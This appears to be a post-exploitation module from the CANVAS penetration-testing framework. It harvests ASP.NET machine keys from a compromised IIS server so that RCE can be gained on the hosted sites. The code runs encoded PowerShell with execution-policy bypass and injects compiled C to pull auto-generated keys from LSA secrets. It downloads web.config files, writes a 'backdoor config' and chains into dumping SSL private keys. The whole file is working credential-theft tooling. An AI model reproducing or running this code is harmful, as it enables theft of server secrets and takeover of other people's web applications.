#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2010
#http://www.immunityinc.com/CANVAS/ for more information

import sys
import math
if "." not in sys.path:
    sys.path.append(".")

from libs.iis_lib import *
import base64

from exploitutils import *

from canvasexploit import canvasexploit
from ExploitTypes.localcommand import LocalCommand

import xml.etree.ElementTree as ET
import json
import binascii

import canvasengine

NAME                   = "get_machinekeys"
DESCRIPTION            = "Grab a list of URLs accessible on an IIS system and machine keys to obtain RCE on them"
DOCUMENTATION          = {}
DOCUMENTATION["Notes"] = """
| Test            | # systems verified | get_machinekey success |
|-----------------+--------------------+------------------------|
| Windows 10 x64  |                  3 | Yes                    |
| Windows 2k8 x64 |                  1 | No/FAIL                |

The reason for the Windows 2k8 failure is that Powershell does not
correctly deliver output to STDOUT, which is needed and expected by
this tool. The module will time out on that Operating System.
"""
VERSION                = "1.0"

PROPERTY               = {}
PROPERTY['TYPE']       = "Commands"
PROPERTY['SITE']       = "Local"
PROPERTY['ARCH']       = [ ["Windows"] ]

def normalize_app_name(app_name):
    if app_name[-1] != "/":
        return app_name + "/"
    else:
        return app_name

def get_ps_output(output):
    start_needle = "START_OUTPUT"
    end_needle = "END_OUTPUT"
    
    if start_needle not in output or end_needle not in output:
        return ""
    else:
        start_idx = output.index(start_needle) + len(start_needle)
        end_idx = output.index(end_needle)

        return output[start_idx:end_idx].lstrip().rstrip()


class theexploit(LocalCommand):
    def __init__(self):
        LocalCommand.__init__(self)
        self.result = ""
        self.name = NAME
        self.supportedNodeTypes = ["win64Node"]


    def shell_expand(self, path):
        logging.info("Shell-expanding:" + path)
        # 0: searching for starting %
        # 1: searching for ending %
        state = 0
        new_path = []
        current_var = []

        for byte in path:
            if state == 0:
                if byte == "%":
                    current_var.append(byte)
                    state = 1
                else:
                    new_path.append(byte)
            elif state == 1:
                current_var.append(byte)
                if byte == "%":
                    var_string = "".join(current_var[1:len(current_var)-1])
                    logging.info("Getting environment variable for:" + var_string)
                    value = self.node.shell.GetEnvironmentVariable(var_string)
                    logging.info("Got expansion: " + value)
                    new_path.append(value)
                    state = 0

        return "".join(new_path)

    def get_site_urls(self, site_info, target_address):
        bindings = site_info.get("bindings")

        port = None
        addresses = []

        if bindings is not None:

            for (index, i) in enumerate(bindings.split(",")):
                protocol = None
                ip = None
                port = None
                domain = None
                
                for (j_index, j) in enumerate(i.split(":")):
                    if j_index == 0:
                        protocol,ip = j.split("/")
                        if ip == "*":
                            ip = target_address
                    elif j_index == 1:
                        port = int(j)
                    elif j_index == 2:
                        domain = j

                assert "/" not in domain
                
                address_entry = {}
                address_entry["url"] = "%s://%s%s" % (protocol,
                                                      ip,
                                                      ("" if port == 80 else ":" + str(port)))
                address_entry["domain"] = (domain if len(domain) != 0 else None)
                address_entry["state"] = site_info["state"]

                addresses.append(address_entry)
        
        return addresses

    def parse_line(self, line):
        output_type = []
        entity = []
        parameter_string = []
        parameters = {}

        # 0: output type
        # 1: entity name
        # 2: parameters
        state = 0
        started = False

        states = {0 : {"begin": True,
                       "end": " "},
                  1 : {"begin": "\"",
                       "end": "\""},
                  2 : {"begin": "(",
                       "end": ")"}}

        for byte in line:
            if not started and states[state]["begin"] != True:
                if byte == states[state]["begin"]:
                    started = True
            else:
                if byte == states[state]["end"]:
                    started = False
                    if state == 2:
                        break
                    else:
                        state += 1
                else:
                    if state == 0:
                        output_type.append(byte)
                    elif state == 1:
                        entity.append(byte)
                    elif state == 2:
                        parameter_string.append(byte)

        # 0: key
        # 1: value
        state = 0
        started = False
        states = {0 : {"begin": True,
                       "end": ":"},
                  1 : {"begin": True,
                       "end": ","}}

        key = []
        value = []

        state = 0
        parameters = {}
        builder = []

        for part in "".join(parameter_string).split(","):
            if state == 0:
                if part.startswith("bindings"):
                    builder.append(part)
                    state = 1
                else:
                    if ":" not in part:
                        continue
                    else:
                        sep_idx = part.index(":")
                        key, value = part[:sep_idx], part[sep_idx+1:]
                        parameters[key] = value
            elif state == 1:
                if part.count(":") > 1:
                    builder.append(part)
                else:
                    final = ",".join(builder)
                    sep_idx = final.index(":")
                    key = final[:sep_idx]
                    value = final[sep_idx+1:]
                    parameters[key] = value
                    builder = []
                    state = 0

                    sep_idx = part.index(":")
                    key, value = part[:sep_idx], part[sep_idx+1:]
                    parameters[key] = value
        
        return ("".join(output_type), "".join(entity), parameters)

    def get_modifier(self, path):
        if not path.endswith("aspx"):
            return None
        
        parts = path.split("/")
        file_name = parts[-1]
        class_name = get_class_name(file_name)

        class_hash = int(self.get_hash_code(class_name), 16)
        logging.info("Found class name from path:" + class_name)

        template_path = "/".join(parts[:-1]) if len(parts) > 2 else "/"
        template_hash = int(self.get_hash_code(template_path), 16)
        logging.info("Found template path from path:" + template_path)

        modifier = (template_hash + class_hash) & 0xffffffff

        logging.info("Obtained machine key modifier %s for %s" % (str(modifier),path))

        return modifier

        
    def get_synopsis(self, out_app_pools, out_app, out_vdir, out_site, out_config, target_interface="888.888.888.888", default_bitness=64):
        site = {}
        app = {}
        app_pool = {}
        vdir = {}
        isapi_query_path = {}
        webengine_path = {}
        global_machine_keys = []

        attack_info = {"configs": []}

        lines = []
        lines.extend(out_app_pools.split("\n"))
        lines.extend(out_app.split("\n"))
        lines.extend(out_vdir.split("\n"))
        lines.extend(out_site.split("\n"))


        for line in lines:
            if len(line.lstrip().rstrip()) != 0:
                (output_type, name, parameters) = self.parse_line(line)

                if output_type.lower() == "site":
                    site[name] = parameters
                elif output_type.lower() == "vdir":
                    vdir[name] = parameters
                elif output_type.lower() == "app":
                    normalized_name = normalize_app_name(name)
                    isapi_query_path[normalized_name] = name
                    app[normalized_name] = parameters
                elif output_type.lower() == "apppool":
                    app_pool[name] = parameters


        root = ET.fromstring(out_config)

        for x in root.findall(".//system.webServer/globalModules/add"):
            if x.attrib["name"].startswith("ManagedEngineV"):
                key = x.attrib["name"][len("ManagedEngine"):].lower()
                value = x.attrib["image"]
                webengine_path[key] = self.shell_expand(value)

        for x in root.findall(".//system.web/machineKey"):
            machine_key = {}
            decryption_key = x.attrib.get("decryptionKey", "")
            validation_key = x.attrib.get("validationKey", "")
            decryption_type = x.attrib.get("decryption")
            validation_type = x.attrib.get("validation")

            if "AutoGenerate" in decryption_key:
                decryption_key = None
            if "AutoGenerate" in validation_key:
                validation_key = None
            if decryption_type is not None:
                if "Auto" in decryption_type:
                    decryption_type = None
            if validation_type is not None:
                if "Auto" in validation_type:
                    validation_type = None


            machine_key["decryption_key"] = decryption_key
            machine_key["validation_key"] = validation_key
            machine_key["source"] = "appcmd/system.web"
            machine_key["validation_type"] = validation_type
            machine_key["decryption_type"] = decryption_type
            global_machine_keys.append(machine_key)

        for (path, parameters) in vdir.iteritems():
            parts = path.split("/")
            site_name = parts[0]
            site_path = path[len(site_name):]
            site_urls = self.get_site_urls(site[site_name], target_interface)
            base_urls = [{"url":site_url["url"] + site_path,
                          "domain":site_url["domain"],
                          "state":site_url["state"] } for site_url in site_urls]
            urls = []

            # get the on-disk path for the app pool
            physical_path = self.shell_expand(parameters["physicalPath"])
            
            count, site_files = self.node.shell.dodir(physical_path)
            logging.info("count:" + str(count))
            logging.info("site_files:" + str(site_files))
            
            if count <= 0:
                urls = [{"url":url["url"], "modifier":None, "domain":url["domain"], "state":url["state"] } for url in base_urls]
            else:
                for site_file_entry in site_files:
                    site_file = site_file_entry[-1]
                    if site_file.endswith(".aspx"):
                        for base_url in base_urls:
                            url = unicode(base_url["url"]) + site_file
                            
                            modifier = self.get_modifier(unicode(site_path) + site_file)
                            urls.append({"url":url,
                                         "modifier":modifier,
                                         "domain":base_url["domain"],
                                         "state":base_url["state"]
                            })

            logging.info("webengine_path:" + str(webengine_path))

            # get the webengine.dll path
            vdir_app = app[path]
            vdir_app_pool = vdir_app["applicationPool"]
            dotnet_version = app_pool[vdir_app_pool]["MgdVersion"]

            vdir_webengine_path = webengine_path.get("%s_%sbit" % (dotnet_version.lower(), default_bitness))

            config_info = {}
            config_info["urls"] = urls
            config_info["physical_path"] = self.shell_expand(physical_path)
            config_info["webengine_path"] = vdir_webengine_path
            config_info["machinekey_query_path"] = isapi_query_path[path][len(site_name):]
            
            config_info["machine_key_first_four"] = self.get_hash_code(config_info["machinekey_query_path"])

            attack_info["configs"].append(config_info)

        attack_info["global_machine_keys"] = global_machine_keys

        return attack_info

    def get_backdoor_config(self):
        system_root = self.node.shell.GetEnvironmentVariable("SystemRoot")
        site_data = self.node.shell.runcommand("SYSTEM_ROOT\\system32\\inetsrv\\appcmd.exe list site".replace("SYSTEM_ROOT", system_root))

        if "Cannot read configuration file due to insufficient permissions" in site_data:
            logging.error("This module must be run as an elevated administrator")
            return None
        
        apppool_data = self.node.shell.runcommand("SYSTEM_ROOT\\system32\\inetsrv\\appcmd.exe list apppool".replace("SYSTEM_ROOT", system_root))
        app_data = self.node.shell.runcommand("SYSTEM_ROOT\\system32\\inetsrv\\appcmd.exe list app".replace("SYSTEM_ROOT", system_root))
        vdir_data = self.node.shell.runcommand("SYSTEM_ROOT\\system32\\inetsrv\\appcmd.exe list vdir".replace("SYSTEM_ROOT", system_root))
        config_data = self.node.shell.runcommand("SYSTEM_ROOT\\system32\\inetsrv\\appcmd.exe list config".replace("SYSTEM_ROOT", system_root))

        logging.info("Site data:" + site_data)
        logging.info("AppPool data:" + apppool_data)
        logging.info("App data:" + app_data)
        logging.info("VDIR data:" + vdir_data)
        
        config = self.get_synopsis(apppool_data, app_data, vdir_data, site_data, "<fixup>" + config_data + "</fixup>", target_interface=self.node.get_interesting_interface())

        return config

    def get_hash_code(self, app_path):
        enc_app_path = base64.b64encode(app_path.encode("utf-8"))
        decode_string = "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\"%s\"))" % (enc_app_path)
        get_hash_command = "[System.StringComparer]::InvariantCultureIgnoreCase.GetHashCode(%s)" % (decode_string)
        format_hash_command = "[string]::Format(\"START_OUTPUT{0:x8}END_OUTPUT\", %s)" % get_hash_command

        logging.info("Getting partial modifier key using: %s" % format_hash_command)
        
        cmd_output = self.node.shell.runcommand("powershell -outputformat text -encodedcommand %s" % base64.b64encode(format_hash_command.encode("utf-16le")))
        hash_code = get_ps_output(cmd_output)

        return hash_code

    def get_wcm_machinekey(self, app_path):
        code = """Add-Type -AssemblyName System.Web; $x = [System.Web.Configuration.WebConfigurationManager]::OpenWebConfiguration("APP_PATH"); $y = $x.GetSection("system.web/machineKey"); [string]::Format("START_OUTPUT{{""validation_key"":""{0}"", ""decryption_key"":""{1}"", ""decryption_type"":""{2}"", ""validation_type"":""{3}""}}END_OUTPUT", $y.ValidationKey, $y.DecryptionKey, $y.Decryption, $y.Validation)""".replace("APP_PATH", app_path)

        encoded_code = base64.b64encode(code.encode("utf-16le"))

        cmd_output = self.node.shell.runcommand("powershell -outputformat text -executionpolicy bypass  -enc %s" % encoded_code)

        output = json.loads(get_ps_output(cmd_output))
        if output["decryption_type"] == "Auto":
            output["decryption_type"] = None
        
        if output["validation_type"] == "Auto":
            output["validation_type"] = None

        output["source"] = "WebConfigurationManager"

        return output
        

    def get_lsa_machinekey_secrets(self, webengine_path):
        logging.info("[get-lsa-secrets] webengine_path:" + webengine_path)
        if webengine_path == None:
            return None
        
        webengine_name = webengine_path.split("\\")[-1]
        resource_path = os.path.join(os.path.dirname(__file__),
                                     "Resources")
        code = None

        self.node.shell.libc.add_generic_win64call(webengine_path,
                                                   "EcbCallISAPI",
                                                   "int",
                                                   *("int * pECB",
                                                     "int iFunction",
                                                     "char * bufferIn",
                                                     "int sizeIn",
                                                     "char * bufferOut",
                                                     "int sizeOut"))
        
        with open(os.path.join(resource_path, "get_machinekey_lsa.c"), "rb") as handle:
            code = handle.read()

        code = code.replace("IMPORT_TYPE", self.node.shell.import_type).replace("WEBENGINE_PATH", webengine_path)

        self.node.shell.clearfunctioncache()
        message = self.node.shell.compile(code)
        self.node.shell.sendrequest(message)
        can_expect_secrets = self.node.shell.readint()
        
        if can_expect_secrets == 0:
            self.node.shell.leave()
            return None
        else:
            # NN: this one appears not to matter
            gen_keys = self.node.shell.readblock()
            autogen_keys = self.node.shell.readblock()
            self.node.shell.leave()

            validation_key = autogen_keys[:64]
            decryption_key = autogen_keys[64:24+64]

            machine_key = {"decryption_key": binascii.hexlify(decryption_key).upper(),
                           "validation_key": binascii.hexlify(validation_key).upper(),
                           "source": "EcbCallISAPI",
                           "decryption_type": None,
                           "validation_type": None}

            return machine_key


        
    def add_local_machinekeys(self, attack_config):
        lsa_secrets = {}
        
        for (index, config) in enumerate(attack_config["configs"]):
            output_path = "./temp_web_config"
            remote_path = config["physical_path"] + "\\web.config"
            download_success = False
            try:
                self.node.shell.download(remote_path,
                                         output_path)
                download_success = True
            except Exception as e:
                logging.info("Unable to download config:" + remote_path)

            ml_list = config.get("machine_keys", [])
            
            if download_success:
                try:
                    root = ET.parse(output_path)
                except Exception as e:
                    continue

                for x in root.findall(".//machineKey"):
                    machine_key = {}
                    decryption_key = x.attrib.get("decryptionKey", "")
                    validation_key = x.attrib.get("validationKey", "")
                    decryption_type = x.attrib.get("decryption")
                    validation_type = x.attrib.get("validation")

                    if "AutoGenerate" in decryption_key:
                        decryption_key = None
                    if "AutoGenerate" in validation_key:
                        validation_key = None
                    if decryption_type is not None:
                        if "Auto" in decryption_type:
                            decryption_type = None
                    if validation_type is not None:
                        if "Auto" in validation_type:
                            validation_type = None

                    machine_key["decryption_key"] = decryption_key
                    machine_key["validation_key"] = validation_key
                    machine_key["source"] = "web.config"
                    machine_key["validation_type"] = validation_type
                    machine_key["decryption_type"] = decryption_type
                    
                    ml_list.append(machine_key)
                
            if lsa_secrets.get(config["webengine_path"]) is None:
                lsa_secrets[config["webengine_path"]] = self.get_lsa_machinekey_secrets(config["webengine_path"])

            ml_list.append(lsa_secrets[config["webengine_path"]])

            wcm_machinekey = self.get_wcm_machinekey(config["machinekey_query_path"])
            if wcm_machinekey != None:
                ml_list.append(wcm_machinekey)

            attack_config["configs"][index]["machine_keys"] = ml_list

        logging.info("Stole all machine keys out of web.config files")
        
    def set_progr(self, msg, percent):
        self.setInfo(("%s - " % NAME) + msg)
        self.setProgress(percent)
        
    def run(self):
        self.setInfo("%s" % NAME)
        node = self.argsDict["passednodes"][0]
        percent = 0
        increase = int(math.ceil(100 / len(self.argsDict["passednodes"])))

        self.results = []

        for (index, node) in enumerate(self.argsDict["passednodes"]):
            if node.nodetype not in self.supportedNodeTypes:
                logging.error("Cannot run get_machinekeys on a non-Windows MOSDEF node")
            else:
                self.node = node
                logging.info("Creating backdoor config for: %s" % self.node)
                backdoor_config = self.get_backdoor_config()
                if backdoor_config != None:
                    self.add_local_machinekeys(backdoor_config)

                    path = os.path.join(
                        self.output(ip=self.node.get_interesting_interface(),
                                    subdir="IISBackdoor"),
                        "config.json-%s.txt" % random.randint(0, 3000))
                    json_data = json.dumps(backdoor_config, indent=4)

                    with open(path, "wb") as handle:
                        handle.write(json_data)

                    logging.info(json_data)
                    logging.info("Wrote backdoor config to: %s" % path)

                    self.results.append(backdoor_config)

                    logging.info("Dumping SSL private keys...")
                    dumper = canvasengine.getModuleExploit("dump_certstore")
                    dumper.link(self)
                    dumper.run()
                else:
                    logging.info("unable to process node %s" % self.node)
                
            percent += increase
            self.set_progr("Processed node %s" % (percent), percent)

        self.setInfo("%s - done (success: %s)" % (NAME, self.result))

        return 1


if __name__=="__main__":
    logging.warning("This module should be used only from within CANVAS")
